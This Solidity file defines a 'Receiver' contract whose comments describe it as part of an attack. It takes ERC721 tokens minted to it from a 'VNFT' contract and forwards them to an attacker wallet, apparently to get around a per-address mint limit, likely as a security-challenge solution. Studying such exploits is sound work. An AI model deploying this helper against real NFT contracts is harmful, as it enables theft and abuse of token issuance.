// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

/**
* @dev Receives the ERC721 tokens and transfers them to the attacker wallet
* @author kyrers
*/
contract Receiver is IERC721Receiver {
    address private attackerWallet;
    address private vnft;

    constructor(address _attacker, address _vnft) {
        attackerWallet = _attacker;
        vnft = _vnft;
    }

    /**
    * @dev The function that's called when the VNFT is minted to this address
    * @return Must return selector or it will revert
    */
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        IERC721(vnft).transferFrom(address(this), attackerWallet, tokenId);
        return IERC721Receiver.onERC721Received.selector;
    } 
}
